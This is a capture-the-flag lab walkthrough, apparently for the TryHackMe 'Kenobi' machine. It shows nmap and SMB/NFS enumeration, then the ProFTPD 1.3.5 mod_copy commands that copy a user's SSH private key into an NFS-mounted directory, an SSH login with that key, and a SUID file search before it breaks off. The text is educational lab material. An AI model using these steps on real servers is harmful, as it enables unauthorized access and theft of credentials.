---
description: Recon
---

# Kenobi

```
nmap -sV -sC --script vuln -oN kenobi.nmap <IP>
```

we see proftp running ; check web in browser http \<ip> nothing there just starears image

run this to scan for samba shares

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.140.50
```

to check the shares

```
smbclient //10.10.140.50/anonymous
```

Download those file (run this under the priv command)

```
wget <filename>
```

we see port 111 has nfs running so we run script

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.140.50
```

we se /var mount there

\---------------------------------------------------------------------------------------------------------------------

From nmap we know proftpd is runnning on 1.3.5&#x20;

So we `searchsploit proftpd 1.3.5` we get 4 exploits

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>Search sploit output</p></figcaption></figure>

The mod\_copy module implements SITE CPFR (copy from)and SITE CPTO (copy to)commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

SITE CPFR /home/kenobi/.ssh/id\_rsa

SITE CPTO /var/tmp/id\_rsa

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

Lets mount the /var/tmp directory to our machine

<pre><code><strong>Lets mount the /var/tmp directory to our machine
</strong>
mkdir /mnt/kenobiNFS
mount 10.10.140.50:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
</code></pre>

then

```
cp /mnt/kenobiNFS/tmp/id_rsa .
```

```
sudo chmod 600 id_rsa 
```

```
ssh -i id_rsa kenobi@10.10.140.50
```

\---------------------------------------Gotccess------------------------------------------------------------------------------------------------------------PrivESC--------------------------------------------------------------------

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: f

`find / -perm -u=s -type f 2>/dev/null`

we find menu is out of ordinary so type menu in command and run

Strings is a command on Linux that looks for human readable strings on a binary.





